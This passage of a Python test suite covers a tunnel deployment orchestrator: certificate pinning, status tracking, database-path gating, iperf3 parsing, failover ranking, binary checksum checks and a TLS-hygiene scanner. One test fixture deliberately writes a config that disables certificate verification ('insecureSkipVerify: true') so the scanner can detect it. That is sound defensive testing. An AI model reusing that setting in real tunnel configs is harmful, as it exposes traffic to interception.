                                   ("backhaul-wss", "backhaul-prod-p7-ca.pem"),
                                   ("frp-TLS", "frp-prod-p7-ca.pem")):
            plan = protocols.generate_deployment(proto, 7, doc_ip, "203.0.113.20", 9443)
            anchor_pem = plan["foreign_files"][f"/etc/best-tunnel/certs/{anchor_name}"]
            served = [c for fpath, c in plan["iran_files"].items() if fpath.endswith("-cert.pem")]
            self.assertTrue(served, f"{proto} shipped no server certificate")
            self.assertEqual(anchor_pem, served[0],
                             f"{proto} pins an anchor that is not the certificate the server presents")
            # frp names the anchor in its config; a file nobody reads is not pinning anything.
            if proto == "frp-TLS":
                frpc = plan["foreign_files"]["/etc/best-tunnel/frp/prod-frpc-p7.toml"]
                self.assertIn("trustedCaFile", frpc, "frpc must be told to verify the server")


    def test_52_a_status_write_must_not_erase_the_recorded_active_tunnel(self):
        """`update_pair_status` defaulted active_tunnel to "", so every TESTING / TESTED /
        TEST_FAILED / DEPLOY_FAILED write cleared the column while the tunnel kept serving - and the
        two live readers of that column answered an erased value by guessing GRE (dashboard.py:1903,
        :1947). On a chisel pair that guess checks units that do not exist and reports DOWN, and in the
        trigger path it excluded GRE from the candidate ranking instead of the protocol actually
        running, so a switchover could re-deploy the live tunnel as its own replacement.
        """
        pid = storage.add_pair(name=f"status_{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")

        for status in ("TESTING", "TESTED", "DEPLOYING", "DEPLOY_FAILED", "TEST_FAILED"):
            storage.update_pair_status(pid, status)
            row = storage.get_pair(pid)
            self.assertEqual(row["status"], status, f"{status} was not recorded")
            self.assertEqual(row["active_tunnel"], "chisel-wss",
                             f"a bare {status} write erased which tunnel is running")

        # The other half of the fix: an explicit value still wins, so a real switchover is recorded.
        storage.update_pair_status(pid, "ACTIVE", "wstunnel-v10")
        self.assertEqual(storage.get_pair(pid)["active_tunnel"], "wstunnel-v10")

        # And the HTTP layer must refuse instead of guessing.
        src = inspect.getsource(dashboard.H.do_POST)
        self.assertNotIn('or "GRE"', src,
                         "an empty active_tunnel is unknown, not GRE")
        self.assertIn('has no recorded active_tunnel', src,
                      "the refusal has to tell the operator what is missing")

        # The dead monitor path keeps its own guess documented but must not be wired in silently.
        self.assertNotIn("evaluate_and_heal(", src,
                         "a checker that guesses the active protocol must not become the auto-heal path")

    def test_53_a_live_session_must_not_pin_hosts_into_the_repository(self):
        """BEST_TUNNEL_DB_PATH moving the database out of the working tree was a comment
        (storage.py:14-20), not a gate. One live command that forgot it - a record-keeping call during
        this audit - connected to both test servers and left two `host_keys.hostname` rows holding
        their routable addresses inside orchestrator/best_tunnel.db, which had to be deleted by hand.
        The first live write of a host address is the TOFU pin, so the gate belongs in the SSH factory,
        before the connection.
        """
        orig = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "outside_repo.db")
            self.assertFalse(storage.db_is_inside_repo(),
                             "a path outside the working tree is the supported live configuration")

            storage.DB_PATH = os.path.join(os.path.dirname(__file__), "best_tunnel.db")
            self.assertTrue(storage.db_is_inside_repo(),
                            "the historical default still resolves inside the repository")

            # The gate was once scoped to orchestrator/ only, so a database written to the repository
            # root read as "outside the working tree". That is not hypothetical: an unquoted Windows
            # path lost its backslashes and created `UsersDELL.best_tunnellive.db` in the root.
            storage.DB_PATH = os.path.join(storage.repo_root(), "UsersDELL.best_tunnellive.db")
            self.assertTrue(storage.db_is_inside_repo(),
                            "the repository root is inside the tree the gate has to cover")

            storage.DB_PATH = os.path.join(os.path.dirname(__file__), "best_tunnel.db")
            with self.assertRaises(RuntimeError) as ctx:
                mock_ssh.get_ssh_runner({"host": "198.51.100.10", "port": 22, "user": "root"},
                                        dry_run=False, host_role="iran")
            self.assertIn("BEST_TUNNEL_DB_PATH", str(ctx.exception),
                          "the refusal has to name the way out")
            self.assertNotIn("198.51.100.10", str(ctx.exception),
                            "a refusal must not repeat the address it is protecting")
            # The mocked path is untouched: dry-run stays the fail-safe default.
            self.assertTrue(isinstance(mock_ssh.get_ssh_runner(
                {"host": "127.0.0.1", "user": "root"}, dry_run=True), mock_ssh.MockSSHClient))
        finally:
            storage.DB_PATH = orig
            stray = os.path.join(os.path.dirname(__file__), "best_tunnel.db")
            # This test only ever proved the predicate; a file left here is the leak it guards. The
            # WAL sidecars are part of that leak: SQLite leaves `best_tunnel.db-wal` and `-shm` behind
            # when only the main file is removed, and the first version of this cleanup did exactly
            # that, so the repository kept two files whose names claim a live database.
            for suffix in ("", "-wal", "-shm"):
                path = stray + suffix
                if os.path.exists(path):
                    os.remove(path)

    def test_54_the_health_verdict_and_the_score_floor_must_be_one_threshold(self):
        """`scoring.compute_lat_score` works in overhead *excess* above the base RTT, saturated at
        LAT_OVERHEAD_CEILING, while `check_health` worked in the raw ratio and compared it to its own
        literal 2.5 (that literal is now failover.py:112). Both called the quantity "overhead", and the
        live pair-2 baseline
        read reached 2.63x - so the scales are not academic: a tunnel at 2.4x was HEALTHY to the monitor
        while its benchmark latency sub-score was already down to 0.07 of its maximum. Equivalent today
        (excess 1.5 == ratio 2.5), but only while one number is derived from the other.
        """
        base, ceiling = 40.0, scoring.LAT_OVERHEAD_CEILING
        self.assertAlmostEqual(base * (ceiling + 1.0), 100.0)
        s_floor, ex_floor = scoring.compute_lat_score(100.0, base_rtt=base)
        self.assertEqual(s_floor, 0.0, "the score floor must sit where the ceiling is defined")
        self.assertAlmostEqual(ex_floor, ceiling)

        pair = {"id": 95, "name": "threshold", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}

        def health(lat_ms: float):
            ir_m, fr_m = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
            for m in (ir_m, fr_m):
                m.connect("198.51.100.10")
                m.state["latency"] = lat_ms
                m.state["packet_loss"] = 0.0
            ir_m.state["services"]["best-tunnel-prod-p95-chisel-server"] = "active"
            fr_m.state["services"]["best-tunnel-prod-p95-chisel-client"] = "active"
            ir_m.state["listeners"][9443] = "tunnel_client"
            return failover.TunnelHealthChecker.check_health(ir_m, fr_m, pair, "chisel-wss",
                                                             base_rtt=base)

        below = health(96.0)   # ratio 2.4, excess 1.4
        above = health(104.0)  # ratio 2.6, excess 1.6
        self.assertEqual(below.status, "HEALTHY", below.details)
        self.assertGreater(scoring.compute_lat_score(96.0, base_rtt=base)[0], 0.0)
        self.assertEqual(above.status, "DEGRADED", above.details)
        self.assertEqual(scoring.compute_lat_score(104.0, base_rtt=base)[0], 0.0)

        # The verdict has to say which scale it used.
        self.assertIn("x base RTT", above.details, above.details)
        self.assertAlmostEqual(above.overhead_ratio, 2.6)

    def test_55_a_leg_that_reported_nothing_is_not_a_leg_that_carried_zero(self):
        """The live xray-reverse row stored `download_mbps: 0.0` with `leg_errors: []`, and the live GRE
        row stored `upload 1124.19 / download 6.50 -> throughput 565.35`. iperf3 answers a failed test
        with a JSON document too ({"error": ...} and no end summary), which the parser accepted as a
        measurement, and averaging two legs that differ by 173x published a capacity number that
        describes neither direction.
        """
        def doc(bits_sent=None, bits_recv=None):
            end = {}
            if bits_sent is not None:
                end["sum_sent"] = {"bits_per_second": bits_sent, "retransmits": 3}
            if bits_recv is not None:
                end["sum_received"] = {"bits_per_second": bits_recv}
            return {"end": end}

        class IperfDocs(mock_ssh.MockSSHClient):
            def __init__(self, docs, **kw):
                super().__init__(**kw)
                self.docs = docs
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "iperf3 -c" in cmd:
                    return (0, json.dumps(self.docs["reverse" if " -R" in cmd else "forward"]), "")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        Gbps = 1_000_000.0

        # 1. An iperf3 error document must read as an unavailable leg, never as 0.0 Mbps measured.
        ir = IperfDocs({"forward": doc(bits_sent=800 * Gbps),
                        "reverse": {"error": "unable to connect to server: Connection refused"}})
        fr = mock_ssh.MockSSHClient(host_role="foreign")
        info = engine.measure_iperf3_throughput(ir, fr, "127.0.0.1", port=8898, duration=1)
        self.assertTrue(info["available"], info)
        self.assertEqual(info["upload_mbps"], 800.0)
        self.assertEqual(info["download_mbps"], 0.0)
        self.assertIn("reverse leg failed", " ".join(info["leg_errors"]), info["leg_errors"])
        self.assertIn("Connection refused", " ".join(info["leg_errors"]))
        self.assertEqual(info["throughput_mbps"], info["upload_mbps"],
                         "a one-legged result must not be averaged against a missing zero")

        # 2. Valid JSON with no end summary is the same class of non-measurement.
        ir2 = IperfDocs({"forward": doc(bits_sent=500 * Gbps), "reverse": {"start": {"version": "3.16"}}},
                        host_role="iran")
        info2 = engine.measure_iperf3_throughput(ir2, mock_ssh.MockSSHClient(host_role="foreign"),
                                                 "127.0.0.1", port=8898, duration=1)
        self.assertIn("no end summary", " ".join(info2["leg_errors"]), info2["leg_errors"])

        # 3. Two real but wildly asymmetric legs must publish the direction a user can rely on, never
        #    the midpoint of two directions that differ by 173x. This is the assertion that used to pin
        #    the average (565.35) - the number the live GRE row shipped with, and the number the
        #    ultraspeed profile's 40% throughput weight was computed from.
        ir3 = IperfDocs({"forward": doc(bits_sent=1124.19 * Gbps),
                         "reverse": doc(bits_recv=6.50 * Gbps)}, host_role="iran")
        info3 = engine.measure_iperf3_throughput(ir3, mock_ssh.MockSSHClient(host_role="foreign"),
                                                 "10.11.61.2", port=8898, duration=1)
        self.assertEqual(info3["leg_errors"], [], info3)
        self.assertEqual(info3["throughput_mbps"], 6.50,
                         "the weaker measured direction is the capacity; the average describes neither")
        self.assertNotEqual(info3["throughput_mbps"], round((1124.19 + 6.50) / 2.0, 2))
        self.assertEqual(info3["upload_mbps"], 1124.19)
        self.assertEqual(info3["download_mbps"], 6.5)
        self.assertEqual(info3["capacity_basis"], "weakest_measured_leg")
        self.assertEqual(info3["asymmetry_ratio"], 173.0)
        self.assertIn("leg_note", info3, "a 173x asymmetry cannot be an unremarked number")
        self.assertIn("not an average", info3["leg_note"])
        by_dir = {l["direction"]: l for l in info3["legs"]}
        self.assertTrue(by_dir["upload"]["measured"] and by_dir["download"]["measured"], info3["legs"])

        # 4. A completed leg that carried zero bytes is a measurement of a dead direction, and it must
        #    stay distinguishable from a leg that never completed.
        ir_z = IperfDocs({"forward": doc(bits_sent=1124.19 * Gbps), "reverse": doc(bits_recv=0.0)},
                         host_role="iran")
        infoz = engine.measure_iperf3_throughput(ir_z, mock_ssh.MockSSHClient(host_role="foreign"),
                                                 "127.0.0.1", port=8898, duration=1)
        self.assertTrue(infoz["available"], infoz)
        self.assertEqual(infoz["throughput_mbps"], 0.0,
                         "a download direction that carried nothing is the capacity verdict")
        self.assertEqual(infoz["leg_errors"], [], infoz)
        self.assertIn("carried zero bytes", infoz["leg_note"], infoz)

        # 5. Both directions completed and nothing flowed: that is an unmeasured capacity, not a
        #    capacity of zero, and the row must say which of the two it got.
        ir_n = IperfDocs({"forward": doc(bits_sent=0.0), "reverse": doc(bits_recv=0.0)},
                         host_role="iran")
        infon = engine.measure_iperf3_throughput(ir_n, mock_ssh.MockSSHClient(host_role="foreign"),
                                                 "127.0.0.1", port=8898, duration=1)
        self.assertFalse(infon["available"], infon)
        self.assertIn("carried zero bytes in every direction", infon["reason"], infon)

        # 6. And a balanced pair of legs carries no such note.
        ir4 = IperfDocs({"forward": doc(bits_sent=400 * Gbps), "reverse": doc(bits_recv=380 * Gbps)},
                        host_role="iran")
        info4 = engine.measure_iperf3_throughput(ir4, mock_ssh.MockSSHClient(host_role="foreign"),
                                                 "127.0.0.1", port=8898, duration=1)
        self.assertNotIn("leg_note", info4, info4)

    def test_56_a_wstunnel_client_that_verifies_needs_a_leaf_it_can_verify(self):
        """Witnessed on the live pair with wstunnel 10.1.7, in that order:

        * as shipped (no --tls-verify-certificate) the client connected and held. Its help text says
          verification is off by default and "the client will happily connect to any server with
          self-signed certificate", so the shipped tunnel is unauthenticated TLS.
        * --tls-verify-certificate alone: 5 handshake attempts in 7s, never registered, no error line.
        * that flag plus the product's own certificate installed as a system trust anchor: still refused
          - although Python's OpenSSL stack verified the identical certificate against the identical
          anchor. The refused property is the CA:TRUE generate_self_signed_cert must carry for the Go
          clients: webpki rejects a CA certificate presented as a leaf.
        * a CA plus a CA:FALSE leaf, CA supplied through SSL_CERT_FILE with a clean system bundle: held
          on one handshake and opened its remote frontend on the server host. SSL_CERT_DIR was ignored.

        So the fix has three parts and each is locked here, plus the two generic properties that made
        the live failure silent in the first place.
        """
        from cryptography import x509
        from cryptography.x509.oid import ExtensionOID
        from cryptography.hazmat.primitives.asymmetric import padding
        import ipaddress

        doc_ip, doc_fr = "198.51.100.10", "203.0.113.20"
        ca_pem, leaf_pem, leaf_key = protocols.generate_ca_leaf_pair(doc_ip, "wstunnel p7 prod")
        ca = x509.load_pem_x509_certificate(ca_pem.encode())
        leaf = x509.load_pem_x509_certificate(leaf_pem.encode())

        self.assertTrue(ca.extensions.get_extension_for_oid(ExtensionOID.BASIC_CONSTRAINTS).value.ca,
                        "the file the peer trusts has to be a CA")
        self.assertFalse(leaf.extensions.get_extension_for_oid(ExtensionOID.BASIC_CONSTRAINTS).value.ca,
                         "a leaf flagged CA:TRUE is exactly what webpki refuses to accept")
        self.assertNotEqual(leaf.subject, leaf.issuer, "the leaf must not be self-signed")
        san = leaf.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        self.assertIn(ipaddress.IPv4Address(doc_ip), san.value.get_values_for_type(x509.IPAddress),
                      "the client dials the IP, so the IP is the name that must match")
        # Prove the chain rather than describing it: the CA's key must verify the leaf's signature.
        ca.public_key().verify(leaf.signature, leaf.tbs_certificate_bytes,
                               padding.PKCS1v15(), leaf.signature_hash_algorithm)
        with self.assertRaises(Exception):
            leaf.public_key().verify(leaf.signature, leaf.tbs_certificate_bytes,
                                     padding.PKCS1v15(), leaf.signature_hash_algorithm)
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        self.assertEqual(load_pem_private_key(leaf_key.encode(), None).key_size, 2048,
                         "a key the TLS library cannot read boots a dead unit, offline-invisibly")

        plan = protocols.generate_deployment("wstunnel-v10", 7, doc_ip, doc_fr, 9443)
        client_unit = plan["foreign_files"]["/etc/systemd/system/best-tunnel-prod-p7-wstunnel-client.service"]
        server_unit = plan["iran_files"]["/etc/systemd/system/best-tunnel-prod-p7-wstunnel-server.service"]
        self.assertIn("--tls-verify-certificate", client_unit,
                      "without the flag the client accepts any certificate, which is the exposure")
        self.assertNotIn("--tls-verify-certificate", server_unit,
                         "the flag is a client option; on the server it would fail the unit")

        env_fr = plan["foreign_files"]["/etc/best-tunnel/wstunnel/prod-env-p7"]
        anchor = re.search(r"^SSL_CERT_FILE=(\S+)$", env_fr, re.M)
        self.assertIsNotNone(anchor, "verification needs an anchor and SSL_CERT_FILE is the only one "
                                     "this binary honours without touching the host trust store")
        # The plan generates its own material, so the chain is checked inside the plan rather than
        # against the pair generated above.
        ca_written = plan["foreign_files"][anchor.group(1)]
        self.assertEqual(ca_written, plan["iran_files"][anchor.group(1)],
                         "the peer has to hold the same CA the server was issued a leaf from")
        served = plan["iran_files"]["/etc/best-tunnel/certs/wstunnel-prod-p7-cert.pem"]
        plan_ca = x509.load_pem_x509_certificate(ca_written.encode())
        plan_leaf = x509.load_pem_x509_certificate(served.encode())
        self.assertTrue(plan_ca.extensions.get_extension_for_oid(
            ExtensionOID.BASIC_CONSTRAINTS).value.ca, "the pinned anchor must be a CA")
        self.assertFalse(plan_leaf.extensions.get_extension_for_oid(
            ExtensionOID.BASIC_CONSTRAINTS).value.ca,
            "the certificate the server presents must be a leaf, or webpki refuses the tunnel")
        self.assertEqual(plan_leaf.issuer, plan_ca.subject)
        plan_ca.public_key().verify(plan_leaf.signature, plan_leaf.tbs_certificate_bytes,
                                    padding.PKCS1v15(), plan_leaf.signature_hash_algorithm)
        san7 = plan_leaf.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        self.assertIn(ipaddress.IPv4Address(doc_ip), san7.value.get_values_for_type(x509.IPAddress),
                      "the dialled address must be the name in the leaf the plan actually ships")

        # The two failure modes that made this silent: a directory the plan never creates, and a
        # teardown that leaves certificate or key material behind.
        for side in ("iran", "foreign"):
            files = plan[f"{side}_files"]
            mkdirs = " ".join(plan[f"{side}_cmds"])
            for fpath in files:
                if fpath.startswith("/etc/best-tunnel/"):
                    self.assertIn(os.path.dirname(fpath), mkdirs,
                                  f"{fpath} is written but its directory is never created")
            gone = " ".join(plan[f"teardown_{side}"])
            for fpath in files:
                self.assertIn(fpath, gone, f"{fpath} survives teardown on {side}")

        # And the Go-based transports must keep the single self-signed shape that works for them:
        # splitting wstunnel out must not have quietly changed what they pin.
        for proto, anchor_name in (("chisel-wss", "chisel-prod-p7-ca.pem"),
                                   ("backhaul-wss", "backhaul-prod-p7-ca.pem")):
            other = protocols.generate_deployment(proto, 7, doc_ip, doc_fr, 9443)
            self.assertEqual(other["foreign_files"][f"/etc/best-tunnel/certs/{anchor_name}"],
                             [c for f, c in other["iran_files"].items()
                              if f.endswith("-cert.pem")][0],
                             f"{proto} silently stopped pinning the certificate it serves")

        openssl = shutil.which("openssl")
        if openssl:
            with tempfile.TemporaryDirectory() as d:
                ca_f, leaf_f = os.path.join(d, "ca.pem"), os.path.join(d, "leaf.pem")
                for path, pem in ((ca_f, ca_pem), (leaf_f, leaf_pem)):
                    with open(path, "w") as fh:
                        fh.write(pem)
                self.assertEqual(subprocess.run([openssl, "verify", "-CAfile", ca_f, leaf_f],
                                                capture_output=True).returncode, 0,
                                 "the shipped chain must verify with an independent implementation")
                self.assertNotEqual(subprocess.run([openssl, "verify", "-CAfile", leaf_f, leaf_f],
                                                   capture_output=True).returncode, 0,
                                    "a CA:FALSE leaf cannot be its own anchor - that is the point")

    def test_57_a_failover_ranking_must_survive_one_noisy_run(self):
        """Live measurement, one unchanged wstunnel-v10 configuration, isolated runs minutes apart:

            score   77.78  45.00  78.58  79.05  72.35
            lat ms  68.9   96.5   68.5   67.3   73.5

        Four agree near 68 ms; the 96.5 ms one crosses the s_lat floor, and the same tunnel that
        measured 79 scored 45. `select_best_candidate` ranked transports on the newest row only, so a
        failover decision for any TLS-over-WebSocket transport was one draw from that distribution.
        Ranking on the median of qualified runs keeps a single-run protocol exactly as it was while
        letting one outlier stop deciding the answer.
        """
        pair_id = storage.add_pair(name=f"median_{int(time.time() * 1000)}",
                                   iran_host="198.51.100.10", foreign_host="203.0.113.20",
                                   frontend_port=9443)
        self.addCleanup(storage.delete_pair, pair_id)
        rows = [("wstunnel-v10", 90.0, 0), ("wstunnel-v10", 90.0, 0), ("wstunnel-v10", 88.0, 0),
                ("chisel-wss", 89.0, 0)]
        for proto, score, dq in rows:
            storage.record_benchmark(pair_id, proto, {"score": score, "disqualified": dq,
                                                     "throughput_mbps": 100.0})

        # Newest-first rows put wstunnel at 88 and chisel at 89, so the pre-fix ranking chose chisel.
        # The median puts wstunnel at 90, which is what three agreeing runs should say.
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["wstunnel-v10", "chisel-wss"]), "wstunnel-v10")

        # A single-run protocol is unaffected: median of one row is that row.
        storage.record_benchmark(pair_id, "frp-TLS", {"score": 91.0, "disqualified": 0,
                                                     "throughput_mbps": 100.0})
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["wstunnel-v10", "chisel-wss", "frp-TLS"]), "frp-TLS")

        # A disqualified newest row is dropped from the sample, not a ban on the transport.
        storage.record_benchmark(pair_id, "wstunnel-v10", {"score": 0.0, "disqualified": 1,
                                                          "throughput_mbps": 0.0})
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["wstunnel-v10", "chisel-wss"]), "wstunnel-v10",
            "one failed measurement must not disqualify a transport that measured well three times")

        # And a protocol with nothing but failed measurements still drops out.
        storage.record_benchmark(pair_id, "kcptun", {"score": 0.0, "disqualified": 1,
                                                    "throughput_mbps": 0.0})
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["kcptun"]), None)

    def test_119_a_simulated_dry_run_row_must_not_rank_a_failover_candidate(self):
        """F1 (audit 2026-10-18, re-verified 2026-10-23): a benchmark run in dry-run mode fills
        deterministic placeholder values (GRE 46.2 ms / 94.2 Mbps and friends) and
        `run_benchmarks` records them in the same table as live runs, marked only by
        `capacity_basis="simulated"` on the iperf block. `select_best_candidate` ranked on
        score alone, so an operator who had merely exercised the dashboard offline could
        have a later live failover decided by numbers nothing ever measured.

        A simulated row is not a failed measurement either: it must not disqualify its
        transport. It is no evidence at all, so a protocol with only simulated rows ranks
        exactly like a protocol with no rows - reachable through the deterministic
        fallback, never through the ranking.
        """
        pair_id = storage.add_pair(name=f"sim_{int(time.time() * 1000)}",
                                   iran_host="198.51.100.10", foreign_host="203.0.113.20",
                                   frontend_port=9443)
        self.addCleanup(storage.delete_pair, pair_id)

        def rec(proto, score, basis=None):
            metrics = {"score": score, "disqualified": 0, "throughput_mbps": 100.0}
            if basis is not None:
                metrics["iperf3"] = {"capacity_basis": basis,
                                      "legs": [{"direction": "download", "mbps": 100.0,
                                                "measured": True}]}
            storage.record_benchmark(pair_id, proto, metrics)

        # wstunnel really measured 88 and 90; a simulated 10 must not drag its median down.
        rec("wstunnel-v10", 88.0, "weakest_measured_leg")
        rec("wstunnel-v10", 90.0, "weakest_measured_leg")
        rec("wstunnel-v10", 10.0, "simulated")
        rec("chisel-wss", 88.5, "weakest_measured_leg")
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["wstunnel-v10", "chisel-wss"]), "wstunnel-v10",
            "the simulated row is not a measurement and must not enter the median")

        # A simulated chart-topper must not beat a real, lower measurement.
        rec("rathole-noise", 99.0, "simulated")
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["rathole-noise", "chisel-wss"]), "chisel-wss",
            "a placeholder score of 99 is not evidence against a measured 88.5")

        # And a protocol with only simulated rows is unmeasured, not banned: with nothing
        # else allowed it still arrives through the deterministic fallback.
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pair_id, "GRE", ["rathole-noise"]), "rathole-noise",
            "simulated-only means no evidence, which the fallback already knows how to treat")

    def test_120_the_shipped_live_launcher_points_the_database_outside_the_repo(self):
        """F2 (audit 2026-10-18, re-verified 2026-10-23): `start_dashboard.bat` is the
        shipped way to run this product. It armed live mode (`BEST_TUNNEL_DRY_RUN=0`)
        and set nothing else, so the database resolved to its default inside the
        repository - and the first live SSH session then raised the inside-repo
        refusal in `get_ssh_runner`, because a live run writes the hosts it touches
        into that file. The documented launcher could not complete its first live
        action; only the internal live harnesses, which set the variable themselves,
        ever got past it.

        The fix belongs to the launcher, not to the gate: the gate is the protection
        and stays exactly as armed. The launcher now points the live database under
        the operator's own .best_tunnel directory unless the operator already set a
        path, and storage creates that directory instead of assuming it exists.
        """
        bat_path = os.path.join(storage.repo_root(), "start_dashboard.bat")
        with open(bat_path, encoding="utf-8", errors="replace") as fh:
            bat = fh.read()
        self.assertRegex(bat, r"set\s+BEST_TUNNEL_DRY_RUN=0")
        m = re.search(r"if\s+not\s+defined\s+BEST_TUNNEL_DB_PATH\s+set\s+"
                      r"BEST_TUNNEL_DB_PATH=(\S+)", bat, re.IGNORECASE)
        self.assertIsNotNone(m, "the launcher arms live mode but never sets "
                                "BEST_TUNNEL_DB_PATH, so its first live session raises")
        template = m.group(1)
        self.assertIn("%USERPROFILE%", template)
        self.assertIn(".best_tunnel", template)

        code = ("import os, storage; "
                "print('inside=', storage.db_is_inside_repo()); "
                "ctx = storage.db_session(); conn = ctx.__enter__(); "
                "conn.execute('SELECT 1'); ctx.__exit__(None, None, None); "
                "print('opened=', os.path.exists(storage.DB_PATH))")
        orch_dir = os.path.dirname(os.path.abspath(__file__))

        # Resolve the template the way cmd.exe would, against a fresh home that has
        # no .best_tunnel directory yet, and prove the whole chain in a clean
        # interpreter: outside the repo, and storage can actually open it there.
        with tempfile.TemporaryDirectory(prefix="bt_f2_") as home:
            expanded = template.replace("%USERPROFILE%", home).replace("\\", os.sep)
            env = dict(os.environ, BEST_TUNNEL_DB_PATH=expanded, BEST_TUNNEL_DRY_RUN="0")
            out = subprocess.run([sys.executable, "-c", code], cwd=orch_dir, env=env,
                                 capture_output=True, text=True, timeout=60)
            self.assertEqual(out.returncode, 0, out.stderr)
            self.assertIn("inside= False", out.stdout)
            self.assertIn("opened= True", out.stdout)

        # And the gate itself is untouched: with no variable set, the default still
        # resolves inside the repository, where the live refusal must keep firing.
        env = {k: v for k, v in os.environ.items() if k != "BEST_TUNNEL_DB_PATH"}
        out = subprocess.run([sys.executable, "-c",
                              "import storage; print('inside=', storage.db_is_inside_repo())"],
                             cwd=orch_dir, env=env, capture_output=True, text=True, timeout=60)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("inside= True", out.stdout)

    def test_121_a_deploy_verifies_its_binaries_through_the_pinned_installer(self):
        """F3 (audit 2026-10-18, re-verified 2026-10-23): binary_manager pins a SHA-256
        for every tunnel binary and can install through that pin, but the production
        deploy path never called it - only tests and a scratch bootstrap script did.
        A deploy therefore started whatever binary happened to be on the host:
        missing, stale or tampered, nothing checked and nothing reported.

        deploy_tunnel now ensures each binary its protocol needs, on both hosts,
        inside the pre-flight gate window - so a verification failure refuses the
        deploy before anything is staged and leaves the serving tunnel untouched.
        """
        # The map covers every protocol the product can deploy, names only binaries
        # the pin table (or the signed distro path) knows, and keeps the two kernel
        # carriers binary-free.
        for proto in protocols.get_supported_protocols() + protocols.SINGBOX_PROTOCOLS:
            self.assertIn(proto, binary_manager.PROTOCOL_BINARIES)
            for binary in binary_manager.required_binaries(proto):
                self.assertTrue(binary in binary_manager.OFFICIAL_CHECKSUMS
                                or binary in binary_manager.APT_PACKAGES,
                                f"{proto} requires unpinned binary {binary}")
        self.assertEqual(binary_manager.required_binaries("GRE"), [])
        self.assertEqual(binary_manager.required_binaries("ESP"), [])

        pid = storage.add_pair(name=f"f3_{int(time.time() * 1000)}",
                               iran_host="198.51.100.10", foreign_host="203.0.113.20",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "f3", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}

        real_verify = binary_manager.verify_and_install_binary
        calls = []

        def recording_verify(runner, binary, version=None, arch="amd64", dry_run=True):
            calls.append((getattr(runner, "host_role", "?"), binary))
            return True, "verified"

        def failing_verify(runner, binary, version=None, arch="amd64", dry_run=True):
            return False, "sha256 mismatch (sealed test double)"

        try:
            binary_manager.verify_and_install_binary = recording_verify
            ir_m = mock_ssh.MockSSHClient(host_role="iran")
            fr_m = mock_ssh.MockSSHClient(host_role="foreign")
            res = engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=False,
                                       force_confirmed=True, ir_runner=ir_m, fr_runner=fr_m)
            self.assertTrue(res["ok"], f"deploy failed with the verifier passing: {res}")
            self.assertEqual(sorted(calls), [("foreign", "chisel"), ("iran", "chisel")],
                             "the deploy must verify its binary on both hosts")

            calls.clear()
            binary_manager.verify_and_install_binary = failing_verify
            ir_m2 = mock_ssh.MockSSHClient(host_role="iran")
            fr_m2 = mock_ssh.MockSSHClient(host_role="foreign")
            with self.assertRaises(ValueError) as ctx:
                engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=False,
                                     force_confirmed=True, ir_runner=ir_m2, fr_runner=fr_m2)
            self.assertIn("chisel", str(ctx.exception))
            self.assertEqual(ir_m2.state["files"], {}, "the refusal staged an iran config")
            self.assertEqual(fr_m2.state["files"], {}, "the refusal staged a foreign config")
        finally:
            binary_manager.verify_and_install_binary = real_verify

    def test_122_the_hygiene_audit_sees_a_tls_disable_in_any_spelling_and_place(self):
        """F4 (audit 2026-10-18, re-verified 2026-10-23): the hygiene audit searched for
        exactly one spelling of a disabled TLS check (`tls-skip-verify`) and only on
        ExecStart= lines. The GOST installer disables verification in a YAML heredoc -
        `insecureSkipVerify: true`, on no ExecStart line at all - so the audit reported
        the tree clean while a shipped client would have accepted any certificate.

        The scan now covers every shipped file and the spellings each config language
        actually uses, with assignment-shaped patterns so prose and comments that name
        a spelling (the chisel installers explain why they refuse it) stay clean. The
        GOST pair itself is fixed the way the other installers already were: the Iran
        side issues a SAN certificate and the foreign side pins it (caFile + secure).
        """
        root = verify_checksums.REPO_ROOT
        with open(os.path.join(root, "foreign-reverse-gost-client-EXPERIMENTAL.sh"),
                  encoding="utf-8") as fh:
            gost_client = fh.read()
        self.assertNotIn("insecureSkipVerify", gost_client)
        self.assertIn("secure: true", gost_client)
        self.assertIn("caFile:", gost_client)
        with open(os.path.join(root, "iran-reverse-gost-server-EXPERIMENTAL.sh"),
                  encoding="utf-8") as fh:
            gost_server = fh.read()
        self.assertIn("certFile:", gost_server)
        self.assertIn("subjectAltName", gost_server)

        tmp = tempfile.mkdtemp(prefix="hygiene_f4_")
        self.addCleanup(shutil.rmtree, tmp, True)
        with open(os.path.join(tmp, "gostish.sh"), "w", encoding="utf-8") as fh:
            fh.write("#!/bin/bash\ncat > /tmp/x.yml <<EOF\n        tls:\n"
                     "          insecureSkipVerify: true\nEOF\n")
        with open(os.path.join(tmp, "prose.sh"), "w", encoding="utf-8") as fh:
            fh.write("#!/bin/bash\n# never write insecureSkipVerify: true in a config\necho hi\n")
